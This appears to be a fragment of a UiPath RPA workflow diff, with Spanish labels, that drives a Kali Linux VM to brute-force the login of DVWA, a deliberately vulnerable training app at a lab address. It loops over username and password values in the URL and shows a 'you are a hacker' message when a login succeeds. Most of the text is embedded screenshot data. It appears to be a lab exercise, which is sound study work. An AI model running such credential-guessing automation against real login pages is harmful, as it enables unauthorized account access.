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" InformativeScreenshot="23ce50fb30aa972016061c810db5587c.png" ScopeSelectorArgument="&lt;wnd app='virtualboxvm.exe' cls='Qt*QWindowIcon' title='kali-linux-2023.3-virtualbox-amd64 [Corriendo] - Oracle VM Virtu*' /&gt;" SearchSteps="Image" TargetType="ImageBased" Version="V2" Visibility="Interactive" />
+                      </uix:NTypeInto.Target>
+                      <uix:NTypeInto.Text>
+                        <InArgument x:TypeArguments="x:String">
+                          <CSharpValue x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpValue`1_2">"10.0.2.4/dvwa/vulnerabilities/brute/?username=" +strUserName + "&amp;password=" + strPassword + "&amp;Login=Login#[k(Enter)]"</CSharpValue>
+                        </InArgument>
+                      </uix:NTypeInto.Text>
+                    </uix:NTypeInto>
+                    <uix:NCheckState DisplayName="Comprobar estado de aplicación 'virtualboxvm.exe kali-l…'" sap:VirtualizedContainerService.HintSize="954,415" sap2010:WorkflowViewState.IdRef="NCheckState_1" ScopeIdentifier="c32c08a6-40fa-4d09-8567-957d778cda6b" Version="V3">
+                      <uix:NCheckState.IfExists>
+                        <Sequence DisplayName="Aparece el destino" sap:VirtualizedContainerService.HintSize="450,105" sap2010:WorkflowViewState.IdRef="Sequence_7">
+                          <sap:WorkflowViewStateService.ViewState>
+                            <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                              <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                            </scg:Dictionary>
+                          </sap:WorkflowViewStateService.ViewState>
+                        </Sequence>
+                      </uix:NCheckState.IfExists>
+                      <uix:NCheckState.IfNotExists>
+                        <Sequence DisplayName="No aparece el destino" sap:VirtualizedContainerService.HintSize="450,198" sap2010:WorkflowViewState.IdRef="Sequence_8">
+                          <sap:WorkflowViewStateService.ViewState>
+                            <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                              <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                            </scg:Dictionary>
+                          </sap:WorkflowViewStateService.ViewState>
+                          <ui:MessageBox Caption="{x:Null}" ChosenButton="{x:Null}" AutoCloseAfter="00:00:00" DisplayName="Bandeja de mensajes" sap:VirtualizedContainerService.HintSize="388,85" sap2010:WorkflowViewState.IdRef="MessageBox_1">
+                            <ui:MessageBox.Text>
+                              <InArgument x:TypeArguments="x:Object">
+                                <CSharpValue x:TypeArguments="x:Object" sap2010:WorkflowViewState.IdRef="CSharpValue`1_15">"Felicidades eres un hacker"</CSharpValue>
+                              </InArgument>
+                            </ui:MessageBox.Text>
+                          </ui:MessageBox>
+                        </Sequence>
+                      </uix:NCheckState.IfNotExists>
+                      <uix:NCheckState.Target>
+                        <uix:TargetAnchorable Accuracy="0.7" DesignTimeRectangle="483, 494, 282, 32" DesignTimeScaleFactor="1" FriendlyName="'virtualboxvm.exe kali-l…'" Guid="b73fd72a-9129-417d-8eb3-690d6e0d6052" ImageBase64="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" InformativeScreenshot="e2a199fbf1e1e11aaab8b52287bbeab1.png" ScopeSelectorArgument="&lt;wnd app='virtualboxvm.exe' cls='Qt*QWindowIcon' title='kali-linux-2023.3-virtualbox-amd64 [Corriendo] - Oracle VM Virtu*' /&gt;" SearchSteps="Image" TargetType="ImageBased" Version="V2" Visibility="Interactive" />
+                      </uix:NCheckState.Target>
+                    </uix:NCheckState>
+                    <Delay DisplayName="Retraso" Duration="00:00:03" sap:VirtualizedContainerService.HintSize="954,90" sap2010:WorkflowViewState.IdRef="Delay_1" />
+                  </Sequence>
+                </ActivityAction>
+              </ui:ForEach.Body>
+              <ui:ForEach.Values>
+                <InArgument x:TypeArguments="sc:IEnumerable">
+                  <CSharpValue x:TypeArguments="sc:IEnumerable" sap2010:WorkflowViewState.IdRef="CSharpValue`1_14">Enumerable.Range(0,4)</CSharpValue>
+                </InArgument>
+              </ui:ForEach.Values>
+            </ui:ForEach>
+          </Sequence>
+        </ActivityAction>
+      </uix:NApplicationCard.Body>
+      <uix:NApplicationCard.TargetApp>
+        <uix:TargetApp Area="-8, -8, 1382, 736" FilePath="C:\\Program Files\\Oracle\\VirtualBox\\virtualboxvm.exe" IconBase64="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" InformativeScreenshot="f657c63a9ef39c79cc53345e6c33c86c.png" Selector="&lt;wnd app='virtualboxvm.exe' cls='Qt*QWindowIcon' title='kali-linux-2023.3-virtualbox-amd64 [Corriendo] - Oracle VM Virtu*' /&gt;" Title="Ubuntu [Corriendo] - Oracle VM VirtualBox" />
+      </uix:NApplicationCard.TargetApp>
+    </uix:NApplicationCard>
+  </Sequence>
+</Activity>
